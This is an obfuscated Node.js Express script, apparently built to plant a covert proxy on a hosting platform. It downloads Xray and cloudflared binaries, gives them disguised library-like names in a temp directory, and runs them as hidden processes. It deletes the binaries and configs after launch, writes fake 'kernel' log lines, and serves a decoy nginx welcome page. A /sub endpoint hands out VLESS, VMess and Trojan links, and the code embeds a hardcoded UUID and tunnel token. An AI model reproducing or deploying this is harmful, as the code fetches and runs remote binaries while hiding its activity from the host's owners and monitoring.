'use strict';const _0x213c73=_0x2922;(function(_0x130c95,_0x24cbb4){const _0xffabed=_0x2922,_0x38279f=_0x130c95();while(!![]){try{const _0x5a4f48=parseInt(_0xffabed(0x10d))/0x1+-parseInt(_0xffabed(0x121))/0x2+-parseInt(_0xffabed(0x148))/0x3+parseInt(_0xffabed(0x110))/0x4*(parseInt(_0xffabed(0x10a))/0x5)+parseInt(_0xffabed(0x144))/0x6*(-parseInt(_0xffabed(0x130))/0x7)+parseInt(_0xffabed(0x118))/0x8+parseInt(_0xffabed(0x133))/0x9;if(_0x5a4f48===_0x24cbb4)break;else _0x38279f['push'](_0x38279f['shift']());}catch(_0x1d3d1c){_0x38279f['push'](_0x38279f['shift']());}}}(_0x3d5b,0x27a24));const express=require(_0x213c73(0x126)),fs=require('node:fs'),fsp=require(_0x213c73(0x115)),path=require(_0x213c73(0x141)),os=require(_0x213c73(0x127)),crypto=require('node:crypto'),{spawn,execFileSync}=require(_0x213c73(0xf3)),{Readable}=require(_0x213c73(0x12e)),{pipeline}=require(_0x213c73(0x12c)),app=express(),PORT=Number(process['env']['PORT']||0xbb8),FILE_PATH=process[_0x213c73(0xf8)][_0x213c73(0x102)]||_0x213c73(0x129),UUID=process[_0x213c73(0xf8)][_0x213c73(0x131)]||'d342d11e-d424-4583-b36e-524ab1f0afa4',ARGO_AUTH=process[_0x213c73(0xf8)]['ARGO_AUTH']||_0x213c73(0x13d),XRAY_LISTEN=_0x213c73(0xfe),XRAY_VLESS_PORT=0x1f41,XRAY_VMESS_PORT=0x1f42,XRAY_TROJAN_PORT=0x1f43,VERSIONS={'XRAY':_0x213c73(0xf9),'CLOUDFLARED':_0x213c73(0x10e)},MIRROR={'XRAY_BASE':_0x213c73(0x108),'CLOUDFLARED_BASE':_0x213c73(0xfd)};function randomName(){const _0xf9d8b2=_0x213c73;return crypto[_0xf9d8b2(0xf6)](0x4)['toString'](_0xf9d8b2(0x113));}function fakeLog(_0xe4d651){const _0x2efccf=_0x213c73,_0x519448=new Date()[_0x2efccf(0x122)]();console[_0x2efccf(0x12f)]('['+_0x519448+']\x20[INFO]\x20[System]\x20'+_0xe4d651);}function getArch(){const _0x3d61e7=_0x213c73,_0x54ba99=os[_0x3d61e7(0x14b)]();return _0x54ba99===_0x3d61e7(0x128)?_0x3d61e7(0xfc):_0x54ba99===_0x3d61e7(0x139)?_0x3d61e7(0x139):_0x3d61e7(0xfc);}async function ensureDir(_0x41b7da){const _0xc78760=_0x213c73;await fsp[_0xc78760(0x13f)](_0x41b7da,{'recursive':!![]});}function _0x2922(_0x870f78,_0x2fa4d4){const _0x3d5bf0=_0x3d5b();return _0x2922=function(_0x2922af,_0x249303){_0x2922af=_0x2922af-0xf0;let _0x59d96f=_0x3d5bf0[_0x2922af];return _0x59d96f;},_0x2922(_0x870f78,_0x2fa4d4);}async function shredFile(_0x43e593){try{await fileExists(_0x43e593)&&await fsp['unlink'](_0x43e593);}catch(_0x55a84b){}}async function fileExists(_0x2e25f3){const _0x1c5b50=_0x213c73;try{return await fsp[_0x1c5b50(0x13c)](_0x2e25f3,fs[_0x1c5b50(0x101)][_0x1c5b50(0x123)]),!![];}catch{return![];}}async function downloadToFile(_0x36a96b,_0x4aa1dc,_0x4de4fd=0x1ed){const _0x55371d=_0x213c73;await ensureDir(path[_0x55371d(0x119)](_0x4aa1dc));const _0x5cee16=await fetch(_0x36a96b,{'headers':{'user-agent':_0x55371d(0x143)}});if(!_0x5cee16['ok'])throw new Error('Fetch\x20failed:\x20'+_0x5cee16[_0x55371d(0x100)]);return await pipeline(Readable['fromWeb'](_0x5cee16[_0x55371d(0x11f)]),fs['createWriteStream'](_0x4aa1dc)),await fsp['chmod'](_0x4aa1dc,_0x4de4fd),_0x4aa1dc;}async function generateXrayConfig(_0x223f68){const _0x26e474=_0x213c73,_0x3d44e9={'log':{'loglevel':_0x26e474(0x136),'access':_0x26e474(0x14a),'error':_0x26e474(0x14a)},'inbounds':[{'listen':XRAY_LISTEN,'port':XRAY_VLESS_PORT,'protocol':_0x26e474(0x132),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'ws','wsSettings':{'path':_0x26e474(0x13b)}}},{'listen':XRAY_LISTEN,'port':XRAY_VMESS_PORT,'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x26e474(0x106)}}},{'listen':XRAY_LISTEN,'port':XRAY_TROJAN_PORT,'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x26e474(0xfa)}}}],'outbounds':[{'protocol':'freedom'}]},_0x5c8a5e=path[_0x26e474(0x111)](FILE_PATH,_0x223f68);return await fsp[_0x26e474(0x117)](_0x5c8a5e,JSON[_0x26e474(0x145)](_0x3d44e9)),_0x5c8a5e;}async function runStealthProcess(_0x5d288a,_0x9aa068,_0x4f6455){const _0x35e6c2=_0x213c73,_0x433de0=spawn(_0x9aa068,_0x4f6455,{'cwd':FILE_PATH,'stdio':['ignore',_0x35e6c2(0x11d),_0x35e6c2(0x11d)],'detached':![]});return _0x433de0['on'](_0x35e6c2(0x134),()=>{}),_0x433de0['unref'](),setTimeout(async()=>{await shredFile(_0x9aa068);},0x1388),_0x433de0;}function _0x3d5b(){const _0x2335fd=['946998zAKmMo','type','/dev/null','arch','/sub','argo','--token','node:child_process','send','&path=%2Fvless#VLESS_STEALTH','randomBytes','auto','env','v25.1.1','/trojan','conf','amd64','https://github.com/cloudflare/cloudflared/releases/download','127.0.0.1','&path=%2Ftrojan#TROJAN_STEALTH','status','constants','FILE_PATH','CLOUDFLARED','config_','listen','/vmess','cloud_d_','https://github.com/XTLS/Xray-core/releases/download','unzip','85kqAlTt','http://127.0.0.1:','--no-autoupdate','44617BZdqbt','2025.1.1','Server\x20listening\x20on\x20port\x20','63284oOprRn','join','.so','hex','net_tunnel','node:fs/promises',':443?security=tls&sni=','writeFile','1169360JYDcdG','dirname','&type=ws&host=','tls','toString','ignore','xray','body','tunnel','527010aSBRKF','toISOString','F_OK','arm64-v8a','--url','express','node:os','x64','/tmp/sys-kernel-worker','from','text/plain','node:stream/promises','lib_net_','node:stream','log','889rhQmPw','UUID','vless','3140550PalHbh','error','base64','none','.json','CLOUDFLARED_BASE','arm64','XRAY_BASE','/vless','access','eyJhIjoiY2Q5OGM5NDRhOWE3NDI1MWU1N2E5ZWZiNGI5ZjRiMjQiLCJ0IjoiYzgyMjUzZTAtMzlhNS00M2NlLWIzNDgtOGE5ZTdkMjZlZTk0IiwicyI6Ik9UWXpOalpoWldRdE9XVTBaaTAwTkRnekxUbGlOall0WmpoaE4ySmlOVGs0TXpsbCJ9','get','mkdir','System\x20Ready.','node:path','run','Mozilla/5.0','3174WqbrWU','stringify','--edge-ip-version','vless://'];_0x3d5b=function(){return _0x2335fd;};return _0x3d5b();}async function startServices(){const _0x50d2fa=_0x213c73,_0x2d5d0c=getArch();fakeLog('Kernel\x20init.\x20Arch:\x20'+_0x2d5d0c),await ensureDir(FILE_PATH);const _0x354ffd={'xray':_0x50d2fa(0x12d)+randomName()+_0x50d2fa(0x112),'argo':_0x50d2fa(0x107)+randomName()+_0x50d2fa(0x112),'conf':_0x50d2fa(0x104)+randomName()+_0x50d2fa(0x137)},_0x1da327={'xray':MIRROR[_0x50d2fa(0x13a)]+'/'+VERSIONS['XRAY']+'/Xray-linux-'+(_0x2d5d0c===_0x50d2fa(0xfc)?'64':_0x50d2fa(0x124))+'.zip','argo':MIRROR[_0x50d2fa(0x138)]+'/'+VERSIONS[_0x50d2fa(0x103)]+'/cloudflared-linux-'+_0x2d5d0c};try{const _0x2bdb29=path['join'](FILE_PATH,'tmp_'+randomName()+'.zip');await downloadToFile(_0x1da327[_0x50d2fa(0x11e)],_0x2bdb29),execFileSync(_0x50d2fa(0x109),['-o',_0x2bdb29,'-d',FILE_PATH],{'stdio':_0x50d2fa(0x11d)}),await shredFile(_0x2bdb29);const _0x4827e0=path[_0x50d2fa(0x111)](FILE_PATH,'xray'),_0x122823=path[_0x50d2fa(0x111)](FILE_PATH,_0x354ffd['xray']);if(await fileExists(_0x4827e0))await fsp['rename'](_0x4827e0,_0x122823);const _0x547d0f=await generateXrayConfig(_0x354ffd[_0x50d2fa(0xfb)]);await runStealthProcess('sys_net',_0x122823,['-c',_0x547d0f]),setTimeout(()=>shredFile(_0x547d0f),0xbb8);const _0x40dfd6=path[_0x50d2fa(0x111)](FILE_PATH,_0x354ffd['argo']);await downloadToFile(_0x1da327[_0x50d2fa(0xf1)],_0x40dfd6);let _0x3aac8e=[];ARGO_AUTH&&ARGO_AUTH['length']>0x14?_0x3aac8e=[_0x50d2fa(0x120),_0x50d2fa(0x146),_0x50d2fa(0xf7),'--no-autoupdate',_0x50d2fa(0x142),_0x50d2fa(0xf2),ARGO_AUTH]:_0x3aac8e=[_0x50d2fa(0x120),_0x50d2fa(0x146),_0x50d2fa(0xf7),_0x50d2fa(0x10c),_0x50d2fa(0x125),_0x50d2fa(0x10b)+XRAY_VLESS_PORT],await runStealthProcess(_0x50d2fa(0x114),_0x40dfd6,_0x3aac8e),fakeLog(_0x50d2fa(0x140));}catch(_0x15aa16){}}app[_0x213c73(0x13e)]('/',(_0x1b20cf,_0x217e8e)=>{const _0x3fce63=_0x213c73;_0x217e8e[_0x3fce63(0x100)](0xc8)[_0x3fce63(0xf4)]('\x0a<!DOCTYPE\x20html>\x0a<html>\x0a<head>\x0a<title>Welcome\x20to\x20nginx!</title>\x0a<style>\x0ahtml\x20{\x20color-scheme:\x20light\x20dark;\x20}\x0abody\x20{\x20width:\x2035em;\x20margin:\x200\x20auto;\x0afont-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;\x20}\x0a</style>\x0a</head>\x0a<body>\x0a<h1>Welcome\x20to\x20nginx!</h1>\x0a<p>If\x20you\x20see\x20this\x20page,\x20the\x20nginx\x20web\x20server\x20is\x20successfully\x20installed\x20and\x0aworking.\x20Further\x20configuration\x20is\x20required.</p>\x0a<p><em>Thank\x20you\x20for\x20using\x20nginx.</em></p>\x0a</body>\x0a</html>\x0a\x20\x20');}),app[_0x213c73(0x13e)](_0x213c73(0xf0),(_0x5df6a4,_0x3f5187)=>{const _0x382a2a=_0x213c73,_0x106365=_0x5df6a4['headers']['host'],_0x1d7bda=_0x382a2a(0x147)+UUID+'@'+_0x106365+':443?encryption=none&security=tls&sni='+_0x106365+_0x382a2a(0x11a)+_0x106365+_0x382a2a(0xf5),_0x5022cf='vmess://'+Buffer[_0x382a2a(0x12a)](JSON[_0x382a2a(0x145)]({'v':'2','ps':'VMESS_STEALTH','add':_0x106365,'port':'443','id':UUID,'aid':'0','scy':_0x382a2a(0xf7),'net':'ws','type':_0x382a2a(0x136),'host':_0x106365,'path':_0x382a2a(0x106),'tls':_0x382a2a(0x11b),'sni':_0x106365}))[_0x382a2a(0x11c)](_0x382a2a(0x135)),_0x4414a2='trojan://'+UUID+'@'+_0x106365+_0x382a2a(0x116)+_0x106365+_0x382a2a(0x11a)+_0x106365+_0x382a2a(0xff);_0x3f5187[_0x382a2a(0x149)](_0x382a2a(0x12b))[_0x382a2a(0xf4)](_0x1d7bda+'\x0a'+_0x5022cf+'\x0a'+_0x4414a2);}),app[_0x213c73(0x105)](PORT,()=>{const _0x2b53db=_0x213c73;fakeLog(_0x2b53db(0x10f)+PORT),startServices();});
